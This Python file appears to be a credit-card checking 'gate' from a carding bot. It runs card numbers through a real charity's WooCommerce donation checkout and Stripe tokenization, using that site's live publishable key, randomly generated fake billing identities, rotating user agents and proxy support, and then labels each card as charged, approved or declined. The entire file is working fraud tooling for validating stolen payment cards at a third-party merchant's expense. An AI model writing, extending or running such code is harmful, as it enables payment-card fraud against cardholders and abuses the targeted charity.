import json
import random
import re
import string
import time
from urllib.parse import quote_plus
import asyncio
import aiohttp

from helpers import classify_gate_response

HTTP_TIMEOUT = aiohttp.ClientTimeout(total=25, connect=10)

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
]

FIRST_NAMES = [
    'James', 'John', 'Robert', 'Michael', 'William', 'David', 'Richard',
    'Joseph', 'Thomas', 'Charles', 'Emily', 'Emma', 'Olivia', 'Ava',
    'Isabella', 'Sophia', 'Mia', 'Charlotte', 'Amelia', 'Harper',
]
LAST_NAMES = [
    'Smith', 'Johnson', 'Williams', 'Brown', 'Jones', 'Garcia', 'Miller',
    'Davis', 'Wilson', 'Taylor', 'Anderson', 'Thomas', 'Jackson', 'White',
    'Harris', 'Martin', 'Thompson', 'Moore', 'Young', 'Allen',
]
STREETS = [
    'Main St', 'Oak Ave', 'Maple Dr', 'Cedar Ln', 'Pine Rd', 'Elm St',
    'Washington Blvd', 'Park Ave', 'Lake Dr', 'Hill Rd',
]
CITIES_STATES = [
    ('Phoenix',      'AZ', '850'),
    ('Los Angeles',  'CA', '900'),
    ('Houston',      'TX', '770'),
    ('Chicago',      'IL', '606'),
    ('Dallas',       'TX', '752'),
    ('San Antonio',  'TX', '782'),
    ('San Diego',    'CA', '921'),
    ('Jacksonville', 'FL', '322'),
    ('Austin',       'TX', '787'),
    ('Columbus',     'OH', '432'),
]

STRIPE_PK = (
    'pk_live_51RJd5fGlfOdBh4Nl2YUzFnY6zYb5IEAkHYSatP353K0wRioIydSEkrK'
    'fWMrApQmyNrPafBOqLy4KQ4a5O3aVODi500IGgjyNG6'
)

ST1_CHARGED_RESPONSE = "Payment Success"


def _http_error(exc: Exception) -> dict:
    low = str(exc).lower()
    if isinstance(exc, asyncio.TimeoutError) or "timed out" in low or "timeout" in low:
        return {"status": "ERROR", "response": "Request timed out", "time": "0s"}
    if "proxy" in low or "tunnel" in low or "407" in low:
        return {"status": "ERROR", "response": str(exc)[:200], "time": "0s"}
    return {"status": "ERROR", "response": str(exc)[:200], "time": "0s"}


async def _process_card_async(cc: str, mm: str, yy: str, cvc: str, proxy_url: str | None = None) -> dict:
    started = time.perf_counter()
    if len(yy) == 2:
        yy = "20" + yy[-2:]
    mm = mm.zfill(2)

    try:
        user_agent = random.choice(USER_AGENTS)

        first_name = random.choice(FIRST_NAMES)
        last_name = random.choice(LAST_NAMES)
        full_name = f"{first_name} {last_name}"
        email_user = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
        email = f"{email_user}@gmail.com"
        street_num = random.randint(100, 99999)
        street = random.choice(STREETS)
        address = f"{street_num} {street}"
        city, state, zip_prefix = random.choice(CITIES_STATES)
        zip_code = zip_prefix + str(random.randint(10, 99))

        def _format_proxy(proxy: str | None) -> str | None:
            if not proxy:
                return None
            p = str(proxy).strip()
            if p.startswith(("http://", "https://", "socks5://", "socks4://")):
                return p
            parts = p.split(":")
            if len(parts) == 4:
                if parts[1].isdigit():
                    return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
                elif parts[3].isdigit():
                    return f"http://{parts[0]}:{parts[1]}@{parts[2]}:{parts[3]}"
                else:
                    return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
            elif len(parts) == 2:
                return f"http://{parts[0]}:{parts[1]}"
            return f"http://{p}"

        formatted_proxy = _format_proxy(proxy_url)
        proxy_args = {"proxy": formatted_proxy} if formatted_proxy else {}


        # Use an isolated session to maintain cookie state per card check
        async with aiohttp.ClientSession(
            connector=aiohttp.TCPConnector(ssl=False),
            timeout=HTTP_TIMEOUT
        ) as session:

            # Step 1: visit donate page
            init_headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'accept-language': 'en-US,en;q=0.9',
                'user-agent': user_agent,
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'none',
            }
            async with session.get(
                'https://forcesforchange.org/donate/',
                headers=init_headers,
                **proxy_args
            ) as init_resp:
                if init_resp.status >= 400:
                    elapsed = f"{time.perf_counter() - started:.2f}s"
                    return {
                        "status": "ERROR",
                        "response": f"Donate page HTTP {init_resp.status}",
                        "time": elapsed,
                    }
                init_text = await init_resp.text()

            # Step 2: add item to cart
            product_id_match = (
                re.search(r'["\']add-to-cart["\']\s*value=["\'](\d+)["\']', init_text)
                or re.search(r'\?add-to-cart=(\d+)', init_text)
                or re.search(r'"product_id"\s*:\s*(\d+)', init_text)
            )
            product_id = product_id_match.group(1) if product_id_match else None

            if product_id:
                async with session.post(
                    'https://forcesforchange.org/',
                    params={'wc-ajax': 'add_to_cart'},
                    headers={
                        'accept': 'application/json, text/javascript, */*; q=0.01',
                        'accept-language': 'en-US,en;q=0.9',
                        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                        'origin': 'https://forcesforchange.org',
                        'referer': 'https://forcesforchange.org/donate/',
                        'user-agent': user_agent,
                        'x-requested-with': 'XMLHttpRequest',
                        'sec-fetch-dest': 'empty',
                        'sec-fetch-mode': 'cors',
                        'sec-fetch-site': 'same-origin',
                    },
                    data={'product_id': product_id, 'quantity': '1'},
                    **proxy_args
                ) as _:
                    pass
            else:
                add_to_cart_match = re.search(
                    r'<form[^>]+class="[^"]*cart[^"]*"[^>]*>(.*?)</form>',
                    init_text, re.DOTALL,
                )
                if add_to_cart_match:
                    inputs = re.findall(
                        r'<input[^>]+name=["\']([^"\']+)["\'][^>]*value=["\']([^"\']*)["\']',
                        add_to_cart_match.group(1),
                    )
                    async with session.post(
                        'https://forcesforchange.org/donate/',
                        headers={
                            'content-type': 'application/x-www-form-urlencoded',
                            'origin': 'https://forcesforchange.org',
                            'referer': 'https://forcesforchange.org/donate/',
                            'user-agent': user_agent,
                        },
                        data=dict(inputs),
                        **proxy_args
                    ) as _:
                        pass

            # Step 3: load checkout page for nonce
            async with session.get(
                'https://forcesforchange.org/checkout/',
                headers=init_headers,
                **proxy_args
            ) as checkout_page_resp:
                checkout_text = await checkout_page_resp.text()

            nonce_match = (
                re.search(r'"woocommerce-process-checkout-nonce"\s*value="([^"]+)"', checkout_text)
                or re.search(r'"checkout_nonce"\s*:\s*"([^"]+)"', checkout_text)
                or re.search(r'"woocommerce-process-checkout-nonce"\s*value="([^"]+)"', init_text)
                or re.search(r'"checkout_nonce"\s*:\s*"([^"]+)"', init_text)
            )
            nonce = nonce_match.group(1) if nonce_match else '716ee815cf'

            # Step 4: tokenize card with Stripe
            cookies = session.cookie_jar.filter_cookies('https://forcesforchange.org')
            stripe_mid = cookies.get('__stripe_mid')
            stripe_mid = stripe_mid.value if stripe_mid else 'c1ccf2d6-5b18-4fdc-a355-a6238ee7137bfb20e4'
            stripe_sid = cookies.get('__stripe_sid')
            stripe_sid = stripe_sid.value if stripe_sid else 'd75866ab-c96e-4246-a6f5-7ff152f406ebcef345'

            stripe_headers = {
                'accept': 'application/json',
                'accept-language': 'en-US,en;q=0.9',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://js.stripe.com',
                'referer': 'https://js.stripe.com/',
                'user-agent': user_agent,
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-site',
            }

            stripe_data = (
                f'billing_details[name]={quote_plus(full_name)}'
                f'&billing_details[email]={quote_plus(email)}'
                f'&billing_details[address][city]={quote_plus(city)}'
                '&billing_details[address][country]=US'
                f'&billing_details[address][line1]={quote_plus(address)}'
                '&billing_details[address][line2]='
                f'&billing_details[address][postal_code]={zip_code}'
                f'&billing_details[address][state]={state}'
                '&type=card'
                f'&card[number]={cc}'
                f'&card[cvc]={cvc}'
                f'&card[exp_year]={yy}'
                f'&card[exp_month]={mm}'
                '&allow_redisplay=unspecified'
                '&pasted_fields=number'
                '&payment_user_agent=stripe.js%2Fc891fde8fc%3B+stripe-js-v3%2Fc891fde8fc'
                '%3B+payment-element%3B+deferred-intent'
                '&referrer=https%3A%2F%2Fforcesforchange.org'
                '&time_on_page=114823'
                f'&guid={stripe_mid}'
                f'&muid={stripe_mid}'
                f'&sid={stripe_sid}'
                f'&key={STRIPE_PK}'
                '&_stripe_version=2024-06-20'
            )

            async with session.post(
                'https://api.stripe.com/v1/payment_methods',
                headers=stripe_headers,
                data=stripe_data,
                **proxy_args
            ) as stripe_resp:
                try:
                    stripe_json = await stripe_resp.json()
                except Exception as je:
                    elapsed = f"{time.perf_counter() - started:.2f}s"
                    return {"status": "ERROR", "response": f"Stripe JSON error: {je}", "time": elapsed}

            payment_method_id = stripe_json.get('id', '')
            elapsed = f"{time.perf_counter() - started:.2f}s"

            if not payment_method_id or not payment_method_id.startswith('pm_'):
                err_msg = (
                    stripe_json.get('error', {}).get('message')
                    or stripe_json.get('error', {}).get('code')
                    or 'Stripe tokenization failed'
                )
                return {"status": "DECLINED", "response": err_msg, "time": elapsed}

            # Step 5: submit WooCommerce checkout
            checkout_headers = {
                'accept': 'application/json, text/javascript, */*; q=0.01',
                'accept-language': 'en-US,en;q=0.9',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'origin': 'https://forcesforchange.org',
                'referer': 'https://forcesforchange.org/donate/',
                'user-agent': user_agent,
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'x-requested-with': 'XMLHttpRequest',
            }

            checkout_data = (
                'wc_order_attribution_source_type=typein'
                '&wc_order_attribution_referrer=(none)'
                '&wc_order_attribution_utm_campaign=(none)'
                '&wc_order_attribution_utm_source=(direct)'
                '&wc_order_attribution_utm_medium=(none)'
                '&wc_order_attribution_utm_content=(none)'
                '&wc_order_attribution_utm_id=(none)'
                '&wc_order_attribution_utm_term=(none)'
                '&wc_order_attribution_utm_source_platform=(none)'
                '&wc_order_attribution_utm_creative_format=(none)'
                '&wc_order_attribution_utm_marketing_tactic=(none)'
                '&wc_order_attribution_session_entry=https%3A%2F%2Fforcesforchange.org%2Fdonate%2F'
                '&wc_order_attribution_session_pages=1'
                '&wc_order_attribution_session_count=1'
                f'&billing_email={quote_plus(email)}'
                f'&billing_first_name={quote_plus(first_name)}'
                f'&billing_last_name={quote_plus(last_name)}'
                '&billing_country=US'
                f'&billing_address_1={quote_plus(address)}'
                '&billing_address_2='
                f'&billing_city={quote_plus(city)}'
                f'&billing_state={state}'
                f'&billing_postcode={zip_code}'
                '&billing_phone='
                '&lang=en'
                '&payment_method=stripe'
                '&wc-stripe-payment-method-upe='
                '&wc_stripe_selected_upe_payment_type='
                '&wc-stripe-is-deferred-intent=1'
                f'&woocommerce-process-checkout-nonce={nonce}'
                '&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review'
                f'&wc-stripe-payment-method={payment_method_id}'
            )

            async with session.post(
                'https://forcesforchange.org/',
                params={'wc-ajax': 'checkout'},
                headers=checkout_headers,
                data=checkout_data,
                **proxy_args
            ) as checkout_resp:
                elapsed = f"{time.perf_counter() - started:.2f}s"
                try:
                    cj = await checkout_resp.json()
                except Exception:
                    text = await checkout_resp.text()
                    return {
                        "status": "ERROR",
                        "response": text[:200],
                        "time": elapsed,
                    }

            if cj.get("result") == "success" or cj.get("redirect") or cj.get("order_id"):
                return {
                    "status": "APPROVED",
                    "response": ST1_CHARGED_RESPONSE,
                    "time": elapsed,
                }

            msg = ""
            if isinstance(cj.get("messages"), str):
                clean = re.sub(r"<[^>]+>", "", cj["messages"]).strip()
                if clean:
                    msg = clean
            if not msg:
                msg = str(cj.get("message") or cj.get("code") or "Declined")
            full = json.dumps(cj, default=str)
            st, out_msg, code = classify_gate_response(f"{msg} {full}")
            if st == "charged":
                return {"status": "APPROVED", "response": ST1_CHARGED_RESPONSE, "time": elapsed}
            if st == "approved":
                return {"status": "DECLINED", "response": out_msg or msg, "time": elapsed}
            if st == "error":
                return {"status": "ERROR", "response": out_msg or msg, "time": elapsed}
            return {"status": "DECLINED", "response": out_msg or msg, "time": elapsed}

    except aiohttp.ClientError as exc:
        elapsed = f"{time.perf_counter() - started:.2f}s"
        err = _http_error(exc)
        err["time"] = elapsed
        return err
    except asyncio.TimeoutError as exc:
        elapsed = f"{time.perf_counter() - started:.2f}s"
        err = _http_error(exc)
        err["time"] = elapsed
        return err
    except Exception as exc:
        elapsed = f"{time.perf_counter() - started:.2f}s"
        return {"status": "ERROR", "response": str(exc)[:200], "time": elapsed}


def _clean_gate_msg(msg: str, limit: int = 120) -> str:
    s = re.sub(r"<[^>]+>", " ", str(msg or ""))
    s = re.sub(r"\s+", " ", s).strip()
    if "{" in s:
        s = s.split("{", 1)[0].strip()
    return (s[:limit] if s else "Declined")


def _map_stripe1_result(raw: dict) -> tuple[str, str, str]:
    """Map gate JSON to bot status: charged | approved | declined | error."""
    api_status = str(raw.get("status") or "")
    resp = str(raw.get("response") or "")
    clean_resp = _clean_gate_msg(resp, 200)
    blob = json.dumps(raw, default=str)
    text = f"{api_status} {resp} {blob}"
    low = f"{resp} {blob}".lower()

    if api_status.upper() == "APPROVED":
        st, _, code = classify_gate_response(
            text + " payment success order success result success charged",
            status_hint="charged",
            code_hint="charged",
        )
        return st, ST1_CHARGED_RESPONSE, code or "charged"

    if api_status.upper() == "ERROR":
        if "timed out" in low or "timeout" in low:
            return "error", clean_resp or "Request timed out", "timeout"
        if "proxy" in low or "tunnel" in low or "407" in low:
            return "error", clean_resp or "Proxy error", "proxy_error"
        st, msg, code = classify_gate_response(text, status_hint="error", code_hint="connection_error")
        if code == "declined":
            return "error", _clean_gate_msg(msg) or clean_resp, "connection_error"
        return st, _clean_gate_msg(msg) or clean_resp, code

    st, msg, code = classify_gate_response(text, status_hint=api_status, code_hint="")
    return st, _clean_gate_msg(msg) or clean_resp, code


async def check_card_stripe_1(cc_str: str, proxy_url: str | None = None) -> tuple[str, str, str]:
    parts = cc_str.replace("/", "|").split("|")
    if len(parts) < 4:
        return "error", "invalid_cc_format", "bad_format"
    cc, mm, yy, cvc = [p.strip() for p in parts[:4]]
    raw = await _process_card_async(cc, mm, yy, cvc, proxy_url)
    return _map_stripe1_result(raw)
